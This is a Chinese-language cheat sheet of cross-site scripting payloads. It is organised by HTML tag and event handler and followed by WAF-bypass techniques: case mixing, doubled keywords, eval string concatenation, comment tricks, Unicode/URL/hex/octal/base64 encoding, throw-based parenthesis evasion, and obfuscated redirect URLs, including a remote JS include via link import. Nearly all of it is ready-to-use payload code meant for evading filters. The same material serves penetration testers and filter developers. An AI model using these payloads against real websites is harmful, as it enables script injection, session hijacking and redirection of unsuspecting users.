无过滤情况
<script>
<scirpt>alert("xss");</script>

<img>
图片加载错误时触发
<img src="x" onerror=alert(1)>
<img src="1" onerror=eval("alert('xss')")>
鼠标指针移动到元素时触发
<img src=1 onmouseover="alert(1)">
鼠标指针移出时触发
<img src=1 onmouseout="alert(1)">

<a>
<a href="https://www.qq.com">qq</a>
<a href=javascript:alert('xss')>test</a>
<a href="javascript:a" onmouseover="alert(/xss/)">aa</a>
<a href="" onclick=alert('xss')>a</a>
<a href="" onclick=eval(alert('xss'))>aa</a>
<a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016>aa</a>

<input>
<input onfocus="alert('xss');">
竞争焦点，从而触发onblur事件
<input onblur=alert("xss") autofocus><input autofocus>
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<input onfocus="alert('xss');" autofocus>
<input name="name" value="">
<input value="" onclick=alert('xss') type="text">
<input name="name" value="" onmouseover=prompt('xss') bad="">
<input name="name" value=""><script>alert('xss')</script>
按下按键时触发
<input type="text" onkeydown="alert(1)">
按下按键时触发
<input type="text" onkeypress="alert(1)">
松开按键式时触发
<input type="text" onkeyup="alert(1)">

<from>
<form action=javascript:alert('xss') method="get">
<form action=javascript:alert('xss')>
<form method=post action=aa.asp? onmouseover=prompt('xss')>
<form method=post action=aa.asp? onmouseover=alert('xss')>
<form action=1 onmouseover=alert('xss)>
<form method=post action="data:text/html;base64,<script>alert('xss')</script>">
<form method=post action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">

<iframe>
<iframe onload=alert("xss");></iframe>
<iframe src=javascript:alert('xss')></iframe>
<iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
<iframe src="data:text/html;base64,<script>alert('xss')</script>">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
<iframe src="aaa" onmouseover=alert('xss') /><iframe>
<iframe src="javascript&colon;prompt&lpar;``xss``&rpar;"></iframe>(````只有两个``)

<svg>
<svg onload=alert(1)>

<body>
<body onload="alert(1)">
利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发
<body onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>

<button>
元素上点击鼠标时触发
<button onclick="alert(1)">text</button>

<p>
元素上按下鼠标时触发
<p onmousedown="alert(1)">text</p>
元素上释放鼠标时触发
<p onmouseup="alert(1)">text</p>

<details>
<details ontoggle="alert('xss');">
使用open属性触发ontoggle事件，无需用户去触发
<details open ontoggle="alert('xss');">

<select>
<select onfocus=alert(1)></select>
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<select onfocus=alert(1) autofocus>

<video>
<video><source onerror="alert(1)">

<audio>
<audio src=x onerror=alert("xss");>

<textarea>
<textarea onfocus=alert("xss"); autofocus>

<keygen>
<keygen autofocus onfocus=alert(1)> //仅限火狐

<marquee>
<marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以

<isindex>
<isindex type=image src=1 onerror=alert("xss")>//仅限于IE

利用link远程包含js文件
在无CSP的情况下才可以
<link rel=import href="http://127.0.0.1/1.js">

javascript伪协议
<a>标签
<a href="javascript:alert('xss');">xss</a>
<iframe>标签
<iframe src=javascript:alert('xss');></iframe>
<img>标签
<img src=javascript:alert('xss')>//IE7以下
<form>标签
<form action="Javascript:alert(1)"><input type=submit>

expression属性
<img style="xss:expression(alert('xss''))"> // IE7以下
<div style="color:rgb('' x:expression(alert(1))"></div> //IE7以下
<style>#test{x:expression(alert(/XSS/))}</style> // IE7以下

background属性
<table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效

存在过滤情况
过滤空格
用 / 代替空格
<img/src="x"/onerror=alert("xss");>

过滤关键字
大小写绕过
<ImG sRc=x onerRor=alert("xss");>
双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)
<imimgg srsrcc=x onerror=alert("xss");>
字符拼接(利用eval)
<img src="x" onerror="a=aler;b=t;c='(xss);';eval(a+b+c)">
字符拼接(利用top)
<script>top["al"+"ert"](``xss``);</script>(只有两个``这里是为了凸显出有`符号)

其它字符混淆
有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
下面举几个简单的例子
可利用注释、标签的优先级等
<<script>alert("xss");//<</script>
<scri<!--test-->pt>alert("hello world!")</scri<!--test-->pt>
<title><img src=</title>><img src=x onerror="alert(``xss``);"> 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>

编码绕过
Unicode编码绕过
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">
<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
url编码绕过
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
Ascii码绕过
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
Hex绕过
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
八进制绕过
<img src=x onerror=alert('\170\163\163')>
base64绕过
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">

过滤双引号，单引号
如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号
<img src="x" onerror=alert(``xss``);>
使用编码绕过，具体看上面列举的例子

过滤括号
当括号被过滤的时候可以使用throw来绕过
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">

过滤url地址
使用url编码
<img src="x" onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``>
使用IP
<img src="x" onerror=document.location=``http://2130706433/``>十进制
<img src="x" onerror=document.location=``http://0177.0.0.01/``>八进制
<img src="x" onerror=document.location=``http://0x7f.0x0.0x0.0x1/``>十六进制
<img src="x" onerror=document.location=``//www.baidu.com``>html标签中用//可以代替http://
使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)
使用中文逗号代替英文逗号
<img src="x" onerror="document.location=``http://www。baidu。com``">//会自动跳转到百度
